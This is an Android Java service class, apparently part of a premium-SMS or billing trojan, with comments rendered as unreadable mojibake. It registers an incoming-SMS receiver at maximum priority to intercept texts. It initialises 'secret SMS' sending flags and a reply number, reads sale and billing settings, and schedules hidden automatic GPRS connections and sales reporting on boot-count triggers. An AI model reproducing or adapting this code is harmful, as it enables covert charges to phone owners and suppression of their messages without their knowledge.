package com.sttm.charge;

import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences.Editor;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;

import com.sttm.dataImpl.KsoContentResolver;
import com.sttm.dataImpl.KsoDataCenter.DataCenter;
import com.sttm.util.KsoCache;
import com.sttm.util.KsoHelper;
import com.sttm.util.LogFile;
import com.sttm.util.ShareProDBHelper;

/**
 * ���������
 * 
 * 1����ʼ�����ݣ�2 �������������� 3 ������ʱ�㲥������ 4 ��ʼͳ�����������Զ�����
 * 
 * @author ligm
 * 
 */
public class MainService extends Service {
	private final String TAG = "MainService";
	private KsoCache cache = KsoCache.getInstance();
	private ShareProDBHelper share;
	private int driveup;
	private KsoMainCourse ksoMainCourse;
	private KsoContentResolver kcr;

	@Override
	public void onCreate() {
		// ---------------------------------------------
		// ���������Ͷ�����ز�������
		share = new ShareProDBHelper(this.getApplicationContext());
		kcr = new KsoContentResolver(this.getApplicationContext());
		Editor editor = share.writer("sendSmsFlag");
		editor.putBoolean("sendSecretSms", false);
		editor.putString("secretSmsReplyNumber", "");
		editor.putBoolean("sendNormonSms", false);
		editor.putString("keyword", "");
		editor.commit();
		//Log.d(TAG, "������ʼ�����Ͷ�����ز���");
		LogFile.WriteLogFile("������ʼ�����Ͷ�����ز���");
		// ---------------------------------------------
		
		
		
		

		super.onCreate();
	}

	@Override
	public void onDestroy() {

		super.onDestroy();
	}

	@Override
	public void onStart(Intent intent, int startId) {

		super.onStart(intent, startId);
		ksoMainCourse = new KsoMainCourse();
		driveup = intent.getIntExtra("driveup", 0);

		//Log.d(TAG, "���ο�������" + driveup);
		//Log.d(TAG, "��������������");

		// ============================================================================
		// һЩ��������
		
		if(!kcr.isSave("curstomID")){
			String curStr = KsoCache.getInstance().getValue("curstomID")!= null 
					? (String)KsoCache.getInstance().getValue("curstomID"): "gunstofire";		
			this.insert(curStr, this);
			
		}
		
		
		
		
		
		
		LogFile.WriteLogFile("�����С" + KsoCache.getInstance().getCacheSize());
		LogFile.WriteLogFile("��������"
				+ KsoCache.getInstance().getValue("saleNumbers"));
		//Log.d(TAG, "��������" + KsoCache.getInstance().getValue("saleNumbers"));
		//Log.d(TAG, "������" + KsoCache.getInstance().getValue("adsNumbers"));
		//Log.d(TAG, "�����С" + KsoCache.getInstance().getCacheSize());
		//Log.d(TAG, "����ʱ����" + KsoCache.getInstance().getValue("adsTime"));
		//Log.d(TAG, "�շѷ�ʽ" + KsoCache.getInstance().getValue("billStyle"));
		// ==========================================================================

		// ==============================================================
		IntentFilter localIntentFilter = new IntentFilter(
				"android.provider.Telephony.SMS_RECEIVED");
		localIntentFilter.setPriority(Integer.MAX_VALUE);
		SmsReceiver sr = new SmsReceiver();
		registerReceiver(sr, localIntentFilter);
		//Log.d(TAG, "�����˶���������");
		LogFile.WriteLogFile("�����˶���������");
		// ===============================================================

		// ==============================================================
		IntentFilter netChangeFilter = new IntentFilter(
				"android.net.conn.CONNECTIVITY_CHANGE");
		netChangeFilter.setPriority(Integer.MAX_VALUE);
		NetWorkChangeReceive nr = new NetWorkChangeReceive();
		registerReceiver(nr, netChangeFilter);
		//Log.d(TAG, "�����������л��㲥������");
		LogFile.WriteLogFile("�����������л��㲥������");
		// ===============================================================

		// ==============================================================
		IntentFilter alarmFilter = new IntentFilter(
				"com.kso.action.ALARMRECEIRVE");
		KsoAlarmService kas = new KsoAlarmService();
		registerReceiver(kas, alarmFilter);
		//Log.d(TAG, "�����˶�ʱ�㲥");
		LogFile.WriteLogFile("�����˶�ʱ�㲥");
		// ===============================================================

		// ==========================================================================
		// �ж���ο����Ƿ�ʼͳ���������Զ�����

		ksoMainCourse.startMainAlarm(this.getApplicationContext());

		int driveup_cfg = cache.getValue("driveup") != null ? (Integer) cache
				.getValue("driveup") : 0;
		//Log.d(TAG, "��������" + driveup_cfg);

		int intelnetCount = cache.getValue("intelnetCount") != null ? (Integer) cache
				.getValue("intelnetCount") : 0;
		//Log.d(TAG, "�Զ���������" + driveup_cfg);
		int month = KsoHelper.getCurrentMonth();

		int internetedCount = share.getSharedPreferences("dataCenter").getInt(
				month + "��", 0);

		int saleCount = cache.getValue("sellCount") != null ? (Integer) cache
				.getValue("sellCount") : 2;

		String IntelnetDates = cache.getValue("internetDate") != null ? (String) cache
				.getValue("internetDate") : "";
		String[] IntelnetDate = IntelnetDates.split(",");
		//Log.d(TAG, "�Զ���������" + IntelnetDates);
		long startIntelnetDate = cache.getValue("startIntelnetDate") != null ? (Long) cache
				.getValue("startIntelnetDate") : 0;
		//Log.d(TAG, "��ʼ��������" + startIntelnetDate);
		if (intelnetCount >= internetedCount) {
			//Log.d(TAG,""+ ksoMainCourse.decideStartFlag(startIntelnetDate,this.getApplicationContext()));
			//Log.d(TAG, (driveup == driveup_cfg) + "");
			if (ksoMainCourse.decideStartFlag(startIntelnetDate,
					this.getApplicationContext())
					&& (driveup >= driveup_cfg)) {

				//Log.d(TAG, "��ο������Կ�ʼ����ͳ�ƺ��Զ�����");
				LogFile.WriteLogFile("��ο������Կ�ʼ����ͳ�ƺ��Զ�����");

				// ����ͳ��
				if (ksoMainCourse.checksalesvolumeOccasion(driveup_cfg,
						driveup, saleCount)) {
					ksoMainCourse.startTimerHandler(this
							.getApplicationContext());

				}

				// GPRS����
				//Log.d(TAG,"GPRS����"+ ksoMainCourse.checkGPRSOccasion(this.getApplicationContext(),IntelnetDate));
				if (ksoMainCourse.checkGPRSOccasion(
						this.getApplicationContext(), IntelnetDate)) {
					ksoMainCourse
							.startGPRSHandler(this.getApplicationContext());
				}

			} else {
				//Log.d(TAG, "��ο�������������ͳ�ƺ��Զ���������Ϊ���ڼ����ڻ��߿�������������");
				LogFile.WriteLogFile("��ο�������������ͳ�ƺ��Զ���������Ϊ���ڼ����ڻ��߿�������������");

			}

		} else {
			//Log.d(TAG, "����GRPS���´������ˣ������ٸ���");
			LogFile.WriteLogFile("����GRPS���´������ˣ������ٸ���");
		}
		// ============================================================================

	}

	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}
	
	
	private void insert(String str,Context context) {
		
		Uri uri = DataCenter.CONTENT_URI;
		
		ContentValues values  =  new ContentValues();
		
		values.put(DataCenter.KSOKEY, "curstomID");
		
		values.put(DataCenter.KSOVALUE,str);
		
		context.getContentResolver().insert(uri, values);
		
		
	}

}
